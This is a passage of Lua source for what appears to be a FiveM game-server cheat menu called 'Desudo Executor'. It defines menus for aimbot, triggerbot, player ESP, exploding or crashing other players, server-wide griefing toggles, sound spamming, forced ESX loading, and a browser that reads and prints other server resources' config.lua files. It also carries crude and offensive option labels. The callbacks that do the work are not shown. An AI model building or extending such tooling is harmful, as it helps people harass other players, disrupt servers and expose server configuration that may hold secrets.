                '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100', '101', '102', '103', '104', '105', '106', '107', '108', '109', '110', '111', '112', '113', '114', '115', '116', '117', '118', '119', '120', '121', '122', '123', '124', '125', '126', '127', '128', '129', '130', '131', '132', '133', '134', '135', '136', '137', '138', '139', '140', '141', '142', '143', '144', '145', '146', '147', '148', '149', '150', '151', '152', '153', '154', '155', '156', '157', '158', '159', '160', '161', '162', '163', '164', '165', '166', '167', '168', '169', '170', '171', '172', '173', '174', '175', '176', '177', '178', '179', '180', '181', '182', '183', '184', '185', '186', '187', '188', '189', '190', '191', '192', '193', '194', '195', '196', '197', '198', '199', '200', '201', '202', '203', '204', '205', '206', '207', '208', '209', '210', '211', '212', '213', '214', '215', '216', '217', '218', '219', '220', '221', '222', '223', '224', '225', '226', '227', '228', '229', '230', '231', '232', '233', '234', '235', '236', '237', '238', '239', '240', '241', '242', '243', '244', '245', '246', '247', '248', '249', '250', '251', '252', '253', '254', '255'
            },
            ['Current'] = 256,
            ['cb'] = SetMenuData
        },
        {
            ['Text'] = 'Menu Green',
            ['Type'] = 'list',
            ['Items'] = {
                '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100', '101', '102', '103', '104', '105', '106', '107', '108', '109', '110', '111', '112', '113', '114', '115', '116', '117', '118', '119', '120', '121', '122', '123', '124', '125', '126', '127', '128', '129', '130', '131', '132', '133', '134', '135', '136', '137', '138', '139', '140', '141', '142', '143', '144', '145', '146', '147', '148', '149', '150', '151', '152', '153', '154', '155', '156', '157', '158', '159', '160', '161', '162', '163', '164', '165', '166', '167', '168', '169', '170', '171', '172', '173', '174', '175', '176', '177', '178', '179', '180', '181', '182', '183', '184', '185', '186', '187', '188', '189', '190', '191', '192', '193', '194', '195', '196', '197', '198', '199', '200', '201', '202', '203', '204', '205', '206', '207', '208', '209', '210', '211', '212', '213', '214', '215', '216', '217', '218', '219', '220', '221', '222', '223', '224', '225', '226', '227', '228', '229', '230', '231', '232', '233', '234', '235', '236', '237', '238', '239', '240', '241', '242', '243', '244', '245', '246', '247', '248', '249', '250', '251', '252', '253', '254', '255'
            },
            ['Current'] = 256,
            ['cb'] = SetMenuData
        },
        {
            ['Text'] = 'Menu Blue',
            ['Type'] = 'list',
            ['Items'] = {
                '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100', '101', '102', '103', '104', '105', '106', '107', '108', '109', '110', '111', '112', '113', '114', '115', '116', '117', '118', '119', '120', '121', '122', '123', '124', '125', '126', '127', '128', '129', '130', '131', '132', '133', '134', '135', '136', '137', '138', '139', '140', '141', '142', '143', '144', '145', '146', '147', '148', '149', '150', '151', '152', '153', '154', '155', '156', '157', '158', '159', '160', '161', '162', '163', '164', '165', '166', '167', '168', '169', '170', '171', '172', '173', '174', '175', '176', '177', '178', '179', '180', '181', '182', '183', '184', '185', '186', '187', '188', '189', '190', '191', '192', '193', '194', '195', '196', '197', '198', '199', '200', '201', '202', '203', '204', '205', '206', '207', '208', '209', '210', '211', '212', '213', '214', '215', '216', '217', '218', '219', '220', '221', '222', '223', '224', '225', '226', '227', '228', '229', '230', '231', '232', '233', '234', '235', '236', '237', '238', '239', '240', '241', '242', '243', '244', '245', '246', '247', '248', '249', '250', '251', '252', '253', '254', '255'
            },
            ['Current'] = 256,
            ['cb'] = SetMenuData
        },
        {
            ['Text'] = 'Menu Alpha',
            ['Type'] = 'list',
            ['Items'] = {
                '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100', '101', '102', '103', '104', '105', '106', '107', '108', '109', '110', '111', '112', '113', '114', '115', '116', '117', '118', '119', '120', '121', '122', '123', '124', '125', '126', '127', '128', '129', '130', '131', '132', '133', '134', '135', '136', '137', '138', '139', '140', '141', '142', '143', '144', '145', '146', '147', '148', '149', '150', '151', '152', '153', '154', '155', '156', '157', '158', '159', '160', '161', '162', '163', '164', '165', '166', '167', '168', '169', '170', '171', '172', '173', '174', '175', '176', '177', '178', '179', '180', '181', '182', '183', '184', '185', '186', '187', '188', '189', '190', '191', '192', '193', '194', '195', '196', '197', '198', '199', '200', '201', '202', '203', '204', '205', '206', '207', '208', '209', '210', '211', '212', '213', '214', '215', '216', '217', '218', '219', '220', '221', '222', '223', '224', '225', '226', '227', '228', '229', '230', '231', '232', '233', '234', '235', '236', '237', '238', '239', '240', '241', '242', '243', '244', '245', '246', '247', '248', '249', '250', '251', '252', '253', '254', '255'
            },
            ['Current'] = 256,
            ['cb'] = SetMenuData
        },
        {
            ['Text'] = 'Delay (ms)',
            ['Type'] = 'list',
            ['Items'] = {
                '25', '50', '75', '100', '125', '150', '175', '200', '225', '250', '275', '300', '325', '350', '375',' 400', '425', '450', '475', '500'
            },
            ['Current'] = 5,
            ['cb'] = SetMenuData
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1
        },
    },
    {},
    {
        {
            ['Text'] = '[~r~Desudo Executor~s~] Melon#5205',
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = '[~r~Desudo Executor~s~] Melon#5205',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = '[~r~Desudo Executor~s~] Melon#5205',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = '[~r~Melon#5205~s~] Melon#5205',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = '[~r~Melon#5205~s~] ~s~Melon#5205',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1
        },
    },
    {
        {
            ['Text'] = 'Interactsound menu →',
            ['Type'] = 'menu',
            ['Menu'] = 23,
        },
        {
            ['Text'] = 'Rape all players',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Explode everyone',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Give server cancer',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Player blips',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = PlayerBlips
        },
        {
            ['Text'] = 'Explode everyone (silent)',
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Prop everyone',
            ['Type'] = 'list',
            ['Items'] = {
                'ferris wheel',
                'container',
                'ufo',
                'gas tank',
                'helicopter'
            },
            ['Current'] = 1,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Remove spawned props',
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1,
        },
    },
    {
        {
            ['Text'] = 'Weapon customization →',
            ['Type'] = 'menu',
            ['Menu'] = 19,
        },
        {
            ['Text'] = 'Infinite ammo',
            ['Type'] = 'list',
            ['Items'] = {'off', 'safe', 'infinite ammo'},
            ['Current'] = 1,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Explosive ammo',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Firework ammo',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Teleport to bullet',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Explosive hands',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Aimbot',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Aimbot [fov]',
            ['Type'] = 'list',
            ['Items'] = {
                '0.05', '0.1', '0.15', '0.2', '0.25', '0.3', '0.35', '0.4', '0.45', '0.5', '0.55', '0.6', '0.65', '0.7', '0.75', '0.8', '0.85', '0.9', '0.95', '1.0'
            },
            ['Current'] = 5,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Aimbot [bone]',
            ['Type'] = 'list',
            ['Items'] = {
                'body', 'head', 'pelvis', 'right calf', 'left calf', 'right foot', 'left foot', 'closest'
            },
            ['Current'] = 1,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Show aimbot fov',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Triggerbot',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Spinbot',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Crosshair',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Give all weapons',
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Remove all weapons',
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Give weapon',
            ['Type'] = 'list',
            ['Items'] = weapons,
            ['Current'] = 1,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1,
        },
    },
    {
        {
            ['Text'] = 'Player boxes',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Player lines',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Player names',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1,
        },
    },
    {},
    {
        {
            ['Text'] = 'Teleport',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer,
        },
        {
            ['Text'] = 'Explode',
            ['Type'] = 'list',
            ['Items'] = {
                'silent',
                'loud',
            },
            ['Current'] = 1,
            ['cb'] = OnlinePlayer,
        },
        -- {
        --     ['Text'] = 'Remove all weapons',
        --     ['Type'] = 'button',
        --     ['cb'] = OnlinePlayer,
        -- },
        {
            ['Text'] = 'Give health',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer,
        },
        {
            ['Text'] = 'Play sound on player',
            ['Type'] = 'list',
            ['Items'] = interactsoundaudios,
            ['Current'] = 1,
            ['cb'] = PlayInteractSound,
        },
        {
            ['Text'] = 'Give armour',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer,
        },
        {
            ['Text'] = 'Crash / lag',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer,
        },
        {
            ['Text'] = 'Cage',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer,
        },
        {
            ['Text'] = 'Allahu akbar',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer
        },
        {
            ['Text'] = 'Drive-by [ped]',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer,
        },
        {
            ['Text'] = 'Slap',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer
        },
        {
            ['Text'] = 'Airstrike',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer
        },
        -- {
        --     ['Text'] = 'Bring vehicle',
        --     ['Type'] = 'button',
        --     ['cb'] = OnlinePlayer
        -- },
        {
            ['Text'] = 'Kick from vehicle',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer
        },
        -- {
        --     ['Text'] = 'Destroy vehicle',
        --     ['Type'] = 'button',
        --     ['cb'] = OnlinePlayer
        -- },
        {
            ['Text'] = 'Give all weapons',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer,
        },
        {
            ['Text'] = 'Give weapon',
            ['Type'] = 'list',
            ['Items'] = weapons,
            ['Current'] = 1,
            ['cb'] = OnlinePlayer,
        },
        {
            ['Text'] = 'Set as friend',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer
        },
        {
            ['Text'] = 'Spectate',
            ['Type'] = 'button',
            ['cb'] = OnlinePlayer,
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 9,
        },
    },
    {
        {
            ['Text'] = 'Attempt to load ESX',
            ['Type'] = 'button',
            ['cb'] = LoadESX
        },
        {
            ['Text'] = 'Force load ESX (NOT SAFE!)',
            ['Type'] = 'button',
            ['cb'] = ForceESX
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1,
        }
    },
    {
        {
            ['Text'] = 'Vehicle spawner →',
            ['Type'] = 'menu',
            ['Menu'] = 17,
        },
        {
            ['Text'] = 'Drive to waypoint →',
            ['Type'] = 'menu',
            ['Menu'] = 13,
        },
        {
            ['Text'] = 'Los Santos Customs →',
            ['Type'] = 'menu',
            ['Menu'] = 14,
        },
        {
            ['Text'] = 'Speedometer',
            ['Type'] = 'list',
            ['Items'] = {
                'off',
                'km/h',
                'mph'
            },
            ['Current'] = 1,
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Max fuel',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Repair car',
            ['Type'] = 'button',
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Stealth repair',
            ['Type'] = 'button',
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Wash car',
            ['Type'] = 'button',
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Delete car',
            ['Type'] = 'button',
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Unlock closest car',
            ['Type'] = 'button',
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1,
        }
    },
    {
        {
            ['Text'] = 'Drive to waypoint',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Speed (km/h)',
            ['Type'] = 'list',
            ['Items'] = {
                '10', '20', '30', '40', '50', '60', '70', '80', '90', '100', '110',' 120', '130', '140', '150', '180', '200', '220'
            },
            ['Current'] = 5,
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 12
        }
    },
    {
        {
            ['Text'] = 'Vehicle cosmetics →',
            ['Type'] = 'menu',
            ['Menu'] = 15,
        },
        {
            ['Text'] = 'Vehicle performance →',
            ['Type'] = 'menu',
            ['Menu'] = 16
        },
        {
            ['Text'] = 'Set vehicle plate text',
            ['Type'] = 'button',
            ['cb'] = CarMenu,
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 12
        }
    },
    {
        {
            ['Text'] = 'Neon lights',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Neon RGB',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Paintjob RGB',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 14
        }
    },
    {
        {
            ['Text'] = 'Boost vehicle',
            ['Type'] = 'list',
            ['Items'] = {
                '0.0', '20.0', '40.0', '60.0', '80.0', '100.0', '120.0', '140.0', '160.0', '180.0', '200.0'
            },
            ['Current'] = 1,
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Horn boost',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Super handling',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 14
        }
    },
    {
        {
            ['Text'] = 'Enter car when spawning',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Spawn car [custom input]',
            ['Type'] = 'button',
            ['cb'] = CarMenu
        },
    },
    {
        {
            ['Text'] = 'Lock time',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = WeatherMenu
        },
        {
            ['Text'] = 'Set hour of day',
            ['Type'] = 'list',
            ['Items'] = {
                '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23'
            },
            ['Current'] = 9,
            ['cb'] = WeatherMenu
        },
        {
            ['Text'] = 'Set weather',
            ['Type'] = 'list',
            ['Items'] = {
                'NONE', 'EXTRASUNNY', 'CLEAR', 'NEUTRAL', 'SMOG', 'FOGGY', 'OVERCAST', 'CLOUDS', 'CLEARING', 'RAIN', 'THUNDER', 'SNOW', 'BLIZZARD', 'SNOWLIGHT', 'XMAS', 'HALLOWEEN'
            },
            ['Current'] = 1,
            ['cb'] = WeatherMenu
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1
        },
    },
    {
        {
            ['Text'] = 'Special finish',
            ['Type'] = 'list',
            ['Items'] = {
                'add', 'remove'
            },
            ['Current'] = 1,
            ['cb'] = WeaponCustomization
        },
        {
            ['Text'] = 'Suppressor',
            ['Type'] = 'list',
            ['Items'] = {
                'add', 'remove'
            },
            ['Current'] = 1,
            ['cb'] = WeaponCustomization
        },
        {
            ['Text'] = 'Scope',
            ['Type'] = 'list',
            ['Items'] = {
                'add', 'remove'
            },
            ['Current'] = 1,
            ['cb'] = WeaponCustomization
        },
        {
            ['Text'] = 'Flashlight',
            ['Type'] = 'list',
            ['Items'] = {
                'add', 'remove'
            },
            ['Current'] = 1,
            ['cb'] = WeaponCustomization
        },
        {
            ['Text'] = 'Grip',
            ['Type'] = 'list',
            ['Items'] = {
                'add', 'remove'
            },
            ['Current'] = 1,
            ['cb'] = WeaponCustomization
        },
        {
            ['Text'] = 'Tint',
            ['Type'] = 'list',
            ['Items'] = {
                'normal', 'green', 'gold', 'pink', 'army', 'lspd', 'orange', 'platinum'
            },
            ['Current'] = 1,
            ['cb'] = WeaponCustomization
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 7
        },
    },
    {},
    {
        {
            ['Text'] = 'Teleport to waypoint',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Teleport to coords',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 2
        },
    },
    {
        {
            ['Text'] = 'Festive',
            ['Type'] = 'list',
            ['Items'] = {'Smoke','Musician','Dj','Coffee','Beer','Air Guitar','Air Shagging','Rock\'n\'roll','Drunk Standing','Vomiting',},
            ['Current'] = 1,
            ['cb'] = AnimationsMenu
        },
        {
            ['Text'] = 'Greetings',
            ['Type'] = 'list',
            ['Items'] = {'Hello','Wave','Handshake','Hugging','Salute',},
            ['Current'] = 1,
            ['cb'] = AnimationsMenu
        },
        {
            ['Text'] = 'Job',
            ['Type'] = 'list',
            ['Items'] = {'Suspect : Surrender','Fishing','Police : Investigate','Police : Use Radio','Police : Traffic','Police : Binoculars','Agriculture : Planting','Mechanic : Fixing Motor','Medic : Kneel','Taxi : Talk to customer','Taxi : Give bill','Grocer : Give','Barman : Serve Shot','Journalist : Take Photos','All Jobs : Clipboard','All Jobs : Hammering','Bum : Holding Sign','Bum : Human Statue',},
            ['Current'] = 1,
            ['cb'] = AnimationsMenu
        },
        {
            ['Text'] = 'Fun',
            ['Type'] = 'list',
            ['Items'] = {'Cheering','Super','Point','Come here','Bring it on','Me','I knew it','Exhausted','I\'m the shit','Facepalm','Calm down ','What did I do?','Fear','Fight ?','It\'s not possible !','Embrace','Finger of honor','You wanker','Bullet in the head',},
            ['Current'] = 1,
            ['cb'] = AnimationsMenu
        },
        {
            ['Text'] = 'Sports',
            ['Type'] = 'list',
            ['Items'] = {'Flex muscles','Lift weights','Do push ups','Do sit ups','Do yoga',},
            ['Current'] = 1,
            ['cb'] = AnimationsMenu
        },
        {
            ['Text'] = 'Divers',
            ['Type'] = 'list',
            ['Items'] = {'Drink coffee','Sit','Lean against wall','Sunbathe Back','Sunbathe Front','Clean','BBQ','Search','Take selfie','Listen to wall/door',},
            ['Current'] = 1,
            ['cb'] = AnimationsMenu
        },
        {
            ['Text'] = 'Walking Styles',
            ['Type'] = 'list',
            ['Items'] = {'Normal M','Normal F','Depressed male','Depressed female','Business','Determined','Casual','Ate too much','Hipster','Injured','In a hurry','Hobo','sad','Muscle','Shocked','Being shady','Buzzed','Hurry','Proud','Short race','Man eater','Sassy','Arrogant',},
            ['Current'] = 1,
            ['cb'] = AnimationsMenu
        },
        {
            ['Text'] = 'NSFW',
            ['Type'] = 'list',
            ['Items'] = {'Man receiving in car','Woman giving in car','Man on bottom in car','Woman on top in car','Scratch nuts','Hooker 1','Hooker 2','Hooker 3','Strip Tease 1','Strip Tease 2','Stip Tease On Knees',},
            ['Current'] = 1,
            ['cb'] = AnimationsMenu
        },
        {
            ['Text'] = 'Cancel animation',
            ['Type'] = 'button',
            ['cb'] = AnimationsMenu
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 2
        },
    },
    {
        {
            ['Text'] = 'Interactsound spammer',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Interactsound blocker',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Play on all',
            ['Type'] = 'list',
            ['Items'] = interactsoundaudios,
            ['Current'] = 1,
            ['cb'] = PlayInteractSound,
        },
        {
            ['Text'] = 'Cancel sound (self)',
            ['Type'] = 'button',
            ['cb'] = PlayInteractSound
        },
        {
            ['Text'] = 'Cancel sound (all)',
            ['Type'] = 'button',
            ['cb'] = PlayInteractSound
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 6
        },
    },
}

local Menu = function()
    
    local selected, selectedfake = 1, 1
    local delay = GetGameTimer()
    local currentmenu = 1

    while true do
        Wait(0)

        if IsDisabledControlJustReleased(0, 121) and not visible then
            menuvisible = true
            if Toggles['Menu sounds'] then
                PlaySoundFrontend(-1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            end
        end

        if menuvisible then

            if IsDisabledControlJustReleased(0, 194) then
                selected = 1
                if Menus[currentmenu][3] then
                    currentmenu = Menus[currentmenu][3]
                else
                    menuvisible = false
                end
                if Toggles['Menu sounds'] then
                    PlaySoundFrontend(-1, 'QUIT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                end
            end

            DrawRect(MenuXOffset, MenuYOffset - 0.275, 0.197, 0.05, table.unpack(MenuColor['Label']))
            DrawTxt(Menus[currentmenu][1], MenuYOffset - 0.29, true, nil, 0.45, MenuXOffset, true, 0.1)
            DrawTxt(tostring(selected) .. '/' .. tostring(#Objects[currentmenu]), MenuYOffset + 0.233, false, nil, 0.25, MenuXOffset, true, 0.1)
            DrawTxt('Melon#5205', MenuYOffset + 0.233, true, nil, 0.23, MenuXOffset - 0.082, true, 0.1)
            DrawTxt('Melon#5205', MenuYOffset + 0.233, true, nil, 0.23, MenuXOffset + 0.082, true, 0.1)
            DrawTxt('Melon#5205', MenuYOffset - 0.253, true, nil, 0.23, MenuXOffset, true, 0.1)

            DrawRect(MenuXOffset, MenuYOffset, 0.197, 0.5, table.unpack(MenuColor['Background']))
            DrawRect(MenuXOffset, MenuYOffset, 0.18, 0.47, table.unpack(RGB(0.1, true)))
            DrawRect(MenuXOffset, MenuYOffset, 0.17, 0.455, table.unpack(MenuColor['Main']))

            local TopOffset = 0.095

            local Stuff = {}
            local Current = 1
            for k, v in pairs(Objects[currentmenu]) do

                if k == selected then
                    selectedfake = Current
                end

                if #Objects[currentmenu] <= 12 then
                    table.insert(Stuff, v)
                    Current = Current + 1
                else
                    if selected <= 12 then
                        if k <= 12 then
                            table.insert(Stuff, v)
                            Current = Current + 1
                        end
                    else
                        if k > (#Objects[currentmenu] - (#Objects[currentmenu] - selected)) - 12 then
                            if k < (#Objects[currentmenu] - (#Objects[currentmenu] - selected)) + 1 then
                                table.insert(Stuff, v)
                                Current = Current + 1
                            end
                        end
                    end
                end
            end

            local List = {}
            for k, v in pairs(Stuff) do
                table.insert(List, v)
            end

            for k, v in pairs(List) do
                local YOffset = MenuYOffset - 0.32
                
                if v['Type'] == 'button' or v['Type'] == 'menu' then
                    if k == selectedfake then
                        DrawTxt(v['Text'], YOffset + TopOffset, false, {255, 255, 255})
                    else
                        DrawTxt(v['Text'], YOffset + TopOffset, false)
                    end
                elseif v['Type'] == 'list' then
                    local text = ('%s ← ~b~%s ~s~→'):format(v['Text'], v['Items'][v['Current']]:lower())
                    if k == selectedfake then
                        DrawTxt(text, YOffset + TopOffset, false, {255, 255, 255})
                    else
                        DrawTxt(text, YOffset + TopOffset, false)
                    end
                elseif v['Type'] == 'toggle' then
                    if k ~= selectedfake then
                        if v['Enabled'] then
                            DrawTxt(v['Text'], YOffset + TopOffset, false, {0, 255, 119})
                        else
                            DrawTxt(v['Text'], YOffset + TopOffset, false, {255, 0, 76})
                        end
                    else
                        if v['Enabled'] then
                            DrawTxt(v['Text'] .. ' ~g~[ON]', YOffset + TopOffset, false, {255, 255, 255})
                        else
                            DrawTxt(v['Text'] .. ' ~r~[OFF]', YOffset + TopOffset, false, {255, 255, 255})
                        end
                    end
                end
                TopOffset = TopOffset + 0.039
            end
            
            if delay < GetGameTimer() then
                if IsDisabledControlPressed(0, 173) then
                    if Objects[currentmenu][selected + 1] then
                        selected = selected + 1
                    else
                        selected = 1
                    end
                    delay = GetGameTimer() + menudelay
                    if Toggles['Menu sounds'] then
                        PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                    end
                elseif IsDisabledControlPressed(0, 172) then
                    if Objects[currentmenu][selected - 1] then
                        selected = selected - 1
                    else
                        selected = #Objects[currentmenu]
                    end
                    delay = GetGameTimer() + menudelay
                    if Toggles['Menu sounds'] then
                        PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                    end
                elseif IsDisabledControlPressed(0, 191) then
                    if Toggles['Menu sounds'] then
                        PlaySoundFrontend(-1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                    end
                    local v = Objects[currentmenu][selected]
                    if v['Type'] == 'toggle' then
                        v['Enabled'] = not v['Enabled']
                        v['cb'](v)
                    elseif v['Type'] == 'button' then
                        v['cb'](v)
                    elseif v['Type'] == 'list' then
                        v['cb'](v)
                    elseif v['Type'] == 'menu' then
                        selected = 1
                        if string.find(v['Text'], "Server resources") then
                            Objects[v['Menu']] = {}
                            for i = 0, GetNumResources() - 1 do
                                if GetResourceState(GetResourceByFindIndex(i)) == 'started' then
                                    table.insert(Objects[v['Menu']], {
                                        ['Text'] = GetResourceByFindIndex(i) .. ' →',
                                        ['Type'] = 'menu',
                                        ['Menu'] = 20,
                                        ['Other'] = GetResourceByFindIndex(i)
                                    })
                                end
                            end
                            table.insert(Objects[v['Menu']], {
                                ['Text'] = 'Back',
                                ['Type'] = 'menu',
                                ['Menu'] = 3
                            })
                        end 
                        if v['Menu'] == 20 then
                            Objects[v['Menu']] = {}
                            local text = LoadResourceFile(v['Other'], 'config.lua')
                            local PrintConfig = function()
                                print(text)
